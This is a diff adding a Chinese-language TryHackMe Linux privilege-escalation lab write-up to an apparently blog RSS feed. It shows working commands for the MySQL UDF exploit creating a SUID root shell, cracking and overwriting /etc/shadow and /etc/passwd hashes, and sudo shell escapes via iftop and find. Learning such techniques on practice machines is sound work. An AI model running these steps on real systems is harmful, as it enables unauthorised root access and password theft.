@@ -446,6 +446,590 @@ PS：靶场我前后打了3个小时左右，其中不乏查找一些资料，�
     </item>
     
     <item>
+      <title>Linux提权方法-基础篇</title>
+      <link>/tryhackme/linux-privesc-%E5%9F%BA%E7%A1%80%E7%AF%87/</link>
+      <pubDate>Tue, 13 Dec 2022 12:02:03 -0500</pubDate>
+      
+      <guid>/tryhackme/linux-privesc-%E5%9F%BA%E7%A1%80%E7%AF%87/</guid>
+      <description>各类Linux提权方法，持续更新。
+0x1 INFO 根据该靶场的介绍，会带我们进行各种​ Linux 权限提升技术​的学习
+0x2 靶机连接 我们按照指示对靶机进行连接，由于OPENssh启用了ssh-rsa，我们必须添加该参数-oHostKeyAlgorithms=+ssh-rsa​
+┌──(kali㉿kali)-[~] └─$ ssh user@10.10.134.160 -oHostKeyAlgorithms=+ssh-rsa The authenticity of host &amp;#39;10.10.134.160 (10.10.134.160)&amp;#39; can&amp;#39;t be established. RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yews Please type &amp;#39;yes&amp;#39;, &amp;#39;no&amp;#39; or the fingerprint: yes Warning: Permanently added &amp;#39;10.10.134.160&amp;#39; (RSA) to the list of known hosts. user@10.10.134.160&amp;#39;s password: Linux debian 2.</description>
+      <content>&lt;blockquote&gt;
+&lt;p&gt;各类Linux提权方法，持续更新。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;0x1-info&#34;&gt;0x1 INFO&lt;/h1&gt;
+&lt;p&gt;根据该靶场的介绍，会带我们进行各种&lt;code&gt;​ Linux 权限提升技术&lt;/code&gt;​的学习&lt;/p&gt;
+&lt;h1 id=&#34;0x2-靶机连接&#34;&gt;0x2 靶机连接&lt;/h1&gt;
+&lt;p&gt;我们按照指示对靶机进行连接，由于OPENssh启用了ssh-rsa，我们必须添加该参数&lt;code&gt;-oHostKeyAlgorithms=+ssh-rsa&lt;/code&gt;​&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ ssh user@10.10.134.160 -oHostKeyAlgorithms&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;+ssh-rsa
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;The authenticity of host &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;10.10.134.160 (10.10.134.160)&amp;#39;&lt;/span&gt; can&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t be established.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;This key is not known by any other names
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? yews
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Please type &amp;#39;&lt;/span&gt;yes&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;, &amp;#39;&lt;/span&gt;no&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; or the fingerprint: yes
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Warning: Permanently added &amp;#39;&lt;/span&gt;10.10.134.160&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; (RSA) to the list of known hosts.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;user@10.10.134.160&amp;#39;&lt;/span&gt;s password: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Linux debian 2.6.32-5-amd64 &lt;span style=&#34;color:#75715e&#34;&gt;#1 SMP Tue May 13 16:34:35 UTC 2014 x86_64&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;The programs included with the Debian GNU/Linux system are free software;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;the exact distribution terms &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; each program are described in the
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;individual files in /usr/share/doc/*/copyright.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;permitted by applicable law.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last login: Fri May &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 06:41:23 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; from 192.168.1.125
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此时已经连接上靶场，回答第一个问题。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; &lt;strong&gt;问题一&lt;/strong&gt;：在部署连接过后运行“id”命令。结果是什么？&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;此时我们按照提示在命令行中输入id即可获取答案&lt;/p&gt;
+&lt;h1 id=&#34;0x2-服务利用&#34;&gt;0x2 服务利用&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;MySQL 服务以 root 身份运行，并且该服务的“root”用户没有分配密码。我们可以使用一个&lt;a href=&#34;https://www.exploit-db.com/exploits/1518&#34;&gt;流行的漏洞利用&lt;/a&gt;，它利用用户定义函数 (UDF) 通过 MySQL 服务以 root 身份运行系统命令。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;使用&lt;code&gt;cd /home/user/tools/mysql-udf&lt;/code&gt;​切换至该目录&lt;/p&gt;
+&lt;p&gt;我们可以看到在靶场给到的超链接中，标题是MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)，是一个mysql4.5到5.0版本linux端的一个漏洞利用，我们首先来看看漏洞利用方式。&lt;/p&gt;
+&lt;p&gt;​&lt;img src=&#34;https://s2.loli.net/2022/12/16/ZBzkMINwDb1ECrp.png&#34; alt=&#34;&#34;&gt;​&lt;/p&gt;
+&lt;p&gt;使用以下命令编译 raptor_udf2.c 漏洞利用代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gcc -g -c raptor_udf2.c -fPIC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;以 root 用户身份使用空白密码连接到 MySQL 服务：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mysql -u root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 MySQL shell 上执行以下命令以使用我们编译的漏洞创建用户定义函数 (UDF)“do_system”：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use mysql;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;create table foo&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;line blob&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;insert into foo values&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;load_file&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/user/tools/mysql-udf/raptor_udf2.so&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; * from foo into dumpfile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/usr/lib/mysql/plugin/raptor_udf2.so&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;create &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; do_system returns integer soname &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;raptor_udf2.so&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用函数将/bin/bash复制到/tmp/rootbash并设置SUID权限：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; do_system&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;退出 MySQL shell 并使用 -p 运行 /tmp/rootbash 可执行文件以获得以 root 权限运行的 shell：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/tmp/rootbash -p
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;请记住在继续之前删除 /tmp/rootbash 可执行文件并退出 root shell：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm /tmp/rootbash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exit
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x3-弱文件权限&#34;&gt;0x3 弱文件权限&lt;/h1&gt;
+&lt;p&gt;/etc/shadow 文件包含用户密码哈希，通常只能由 root 用户读取。&lt;/p&gt;
+&lt;p&gt;请注意，VM 上的 /etc/shadow 文件是全局可读的：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;ls -l /etc/shadow&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;查看/etc/shadow文件内容：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;cat /etc/shadow&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;文件的每一行代表一个用户。可以在每行的第一个和第二个冒号 (:) 之间找到用户的密码哈希（如果他们有的话）。&lt;/p&gt;
+&lt;p&gt;将 root 用户的哈希值保存到 Kali VM 上一个名为 hash.txt 的文件中，然后使用 john the ripper 来破解它。可能需要先解压缩 /usr/share/wordlists/rockyou.txt.gz 并根据您的 Kali 版本使用 sudo 运行命令：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt&lt;/code&gt;​&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ john --wordlist&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hash.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Using default input encoding: UTF-8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Loaded &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; password hashes with &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; different salts &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sha512crypt, crypt&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; $6$ &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;SHA512 256/256 AVX2 4x&lt;span style=&#34;color:#f92672&#34;&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cost &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;iteration count&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; is &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; all loaded hashes
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Will run &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; OpenMP threads
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Press &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; status
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;自己去尝试一下吧      &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1g 0:00:00:04 0.11% &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ETA: 10:59:33&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 0.2336g/s 4306p/s 4785c/s 4785C/s sweetgurl..libragirl
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Use the &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Session aborted
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;切换到root用户，使用破解的密码：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;su root&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;还有一种方式，写入&lt;/p&gt;
+&lt;p&gt;/etc/shadow 文件包含用户密码哈希，通常只能由 root 用户读取。&lt;/p&gt;
+&lt;p&gt;请注意，VM 上的 /etc/shadow 文件是全局可写的：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;ls -l /etc/shadow&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;使用您选择的密码生成新密码哈希：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;mkpasswd -m sha-512 “你的密码”&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;编辑 /etc/shadow 文件并将原始 root 用户的密码哈希替换为您刚刚生成的密码。&lt;/p&gt;
+&lt;p&gt;切换到 root 用户，使用新密码：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;su root&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;另一种同样利用方式&lt;/p&gt;
+&lt;p&gt;/etc/passwd 文件包含有关用户帐户的信息。它是全局可读的，但通常只能由 root 用户写入。从历史上看，/etc/passwd 文件包含用户密码哈希值，某些版本的 Linux 仍然允许将密码哈希值存储在那里。&lt;/p&gt;
+&lt;p&gt;请注意，/etc/passwd 文件是全局可写的：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;ls -l /etc/passwd&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;使用您选择的密码生成新密码哈希：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;openssl passwd “你的新密码”&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;编辑 /etc/passwd 文件并将生成的密码散列放在根用户行的第一个和第二个冒号 (:) 之间（替换“x”）。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ openssl passwd open123456
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: truncating password to &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; characters
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;P1kI55UCjXLJM
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;切换到 root 用户，使用新密码：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;su root&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;或者，复制 root 用户的行并将其附加到文件底部，将单词“root”的第一个实例更改为“newroot”并将生成的密码哈希 放在第一个和第二个冒号之间（替换“x”） .&lt;/p&gt;
+&lt;p&gt;现在切换到 newroot 用户，使用新密码：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;su newroot&lt;/code&gt;​&lt;/p&gt;
+&lt;h1 id=&#34;0x4-shell转义序列&#34;&gt;0x4 shell转义序列&lt;/h1&gt;
+&lt;p&gt;列出 sudo 允许您的用户运行的程序：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;sudo -l&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;访问 GTFOBins ( &lt;a href=&#34;https://gtfobins.github.io/&#34;&gt;https://gtfobins.github.io&lt;/a&gt; ) 并搜索一些程序名称。如果程序以“sudo”作为函数列出，您可以使用它来提升权限，通常是通过转义序列。&lt;/p&gt;
+&lt;p&gt;从列表中选择一个程序并尝试使用 GTFOBins 中的说明获取 root shell&lt;/p&gt;
+&lt;p&gt;首先我们执行sudo -l查看&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Matching Defaults entries &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; user on this host:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    env_reset, env_keep&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;LD_PRELOAD, env_keep&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;LD_LIBRARY_PATH
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User user may run the following commands on this host:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/sbin/iftop
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/find
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/nano
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/vim
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/man
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/awk
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/less
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/ftp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/nmap
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/sbin/apache2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /bin/more
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;iftop&#34;&gt;iftop&lt;/h3&gt;
+&lt;p&gt;​&lt;img src=&#34;https://s2.loli.net/2022/12/17/nG8jbfFeWoNxuU9.png&#34; alt=&#34;&#34;&gt;​&lt;/p&gt;
+&lt;p&gt;打开GTFOBins，搜索第一个iftop，任何按照说明&lt;/p&gt;
+&lt;p&gt;首先sudo iftop进入iftop，在命令行输入!/bin/sh&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ sudo iftop
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;interface: eth0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IP address is: 10.10.134.160
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MAC address is: 02:7a:ce:e8:51:93
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;find&#34;&gt;find&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ sudo find . -exec /bin/sh &lt;span style=&#34;color:#ae81ff&#34;&gt;\;&lt;/span&gt; -quit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;nano&#34;&gt;nano&lt;/h3&gt;
